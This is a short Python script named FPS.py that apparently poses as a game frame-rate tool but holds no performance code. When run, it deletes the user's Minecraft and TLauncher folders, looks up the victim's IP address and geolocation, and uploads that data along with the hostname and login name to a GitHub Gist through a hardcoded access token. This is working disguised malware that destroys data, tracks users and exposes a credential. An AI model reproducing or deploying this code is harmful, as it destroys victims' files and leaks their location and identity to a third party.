# FPS.py
import os, sys, json, requests, socket, platform, subprocess, shutil
from pathlib import Path

APP_DATA = os.getenv('APPDATA') if platform.system() == 'Windows' else os.path.expanduser('~')
TARGETS = ['.minecraft', '.tlauncher']
GIST_URL = 'https://api.github.com/gists/1057e223709a9fa9b1be66071967fd3f'
GIST_TOKEN = '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'  # замените на свой

def get_geo():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        data = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,org', timeout=5).json()
        return {'ip': ip, **data}
    except:
        return {'error': 'geo_fail'}

def nuke_folders():
    for name in TARGETS:
        path = Path(APP_DATA) / name
        if path.exists():
            try:
                shutil.rmtree(path)
                print(f'[+] Deleted: {path}')
            except:
                print(f'[-] Permission denied: {path}')
        else:
            print(f'[!] Not found: {path}')

def push_to_gist(geo):
    try:
        headers = {'Authorization': f'token {GIST_TOKEN}', 'Accept': 'application/vnd.github.v3+json'}
        content = json.dumps({'geo': geo, 'hostname': socket.gethostname(), 'user': os.getlogin()}, indent=2)
        payload = {'files': {'fps_log.json': {'content': content}}}
        requests.patch(GIST_URL, json=payload, headers=headers, timeout=10)
    except:
        pass

if __name__ == '__main__':
    try:
        nuke_folders()
        geo = get_geo()
        push_to_gist(geo)
    except:
        pass
    sys.exit(0)